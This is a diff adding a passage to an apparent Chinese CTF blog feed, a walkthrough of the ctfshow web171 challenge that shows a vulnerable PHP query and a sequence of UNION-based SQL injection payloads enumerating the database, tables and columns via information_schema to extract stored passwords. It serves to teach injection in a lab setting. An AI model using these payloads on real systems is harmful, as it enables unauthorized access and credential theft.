@@ -3450,6 +3450,38 @@ web82写的脚本改改直接用</p>
 <p>和上题一样的方法</p>
 <h2 id="sql注入-171-253"><a class="header-anchor" href="#sql注入-171-253">¶</a>sql注入(171-253)</h2>
 <h3 id="web171"><a class="header-anchor" href="#web171">¶</a>web171</h3>
+<p>打开题目，接下来150道全是sql注入了QWQ，先输入1查询<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/FSI1%28MA%25MKN%7BYMRW1NWO81D.png" alt=""><br>
+这里我们可以看到查询语句是这样的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+<p>当我们输入id=1的时候，语句代入数据库中查询就会变成这样</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39; limit 1;</span><br></pre></td></tr></table></figure>
+<p>如果我们加个单引号，即</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39;&#39; limit 1;</span><br></pre></td></tr></table></figure>
+<p>语句不规范就会报错<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/LGZW%28DB%29Q7~%40%60%60KD%7DVQB4DR.png" alt=""><br>
+如果我们在后面加个注释符，即变成<code>id=1'--+</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39;--+&#39; limit 1;</span><br><span class="line">注释符--+会把后面的语句全注释掉，就不会报错，语句就变成了</span><br><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/_ENH4ILOVOROUAWSEF9V%5DF8.png" alt=""><br>
+接下来我们用<code>order by</code>语句测试有多少列</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 4 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/SY%5DN4Y%28DZMFKCU4OS3QKYUS.png" alt=""><br>
+可以看到4列的时候报错，我们再减小数字<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/8%28%299RW79ZG%7DH4COV%7B%5B1%5BDNY.png" alt=""><br>
+3列的时候正确回显了数据，说明只有三列(当然明眼的师傅前面已经看得出是只有三列了)<br>
+接下来，我们查一下数据库名字，这里用union语句来连接查询，并且在前面把id改成-1以达到把查询id回显的数据给置空的目的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select database(),2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/6LLV7%5BKF%284A%5DV9JEPHT%7DH%5B7.png" alt=""><br>
+回显出数据库名字为ctfshow_web，接下来查询表，这里我们用group_concat函数，它可以把相同行的数据都组合起来</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select group_concat(table_name),2,3 from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot; --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/3D~%7DX%7DV34~B%5BW_%5D%25HX%28Z8UY.png" alt=""><br>
+查出表名为ctfshow_user，接下来再去查列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select group_concat(column_name),2,3 from information_schema.columns where table_name&#x3D;&quot;ctfshow_user&quot;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/43KMZ%253X54%25%28YL%24NKJ%40CYCT.png" alt=""><br>
+得到有id,username,password三个列名，然后再password中找到了flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select password,2,3 from ctfshow_user--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/5%407OH%24R%5BIP0Q7E0%29PO%2815%282.png" alt=""></p>
+<h3 id="web172"><a class="header-anchor" href="#web172">¶</a>web172</h3>
 ]]></content>
       <tags>
         <tag>CTF</tag>
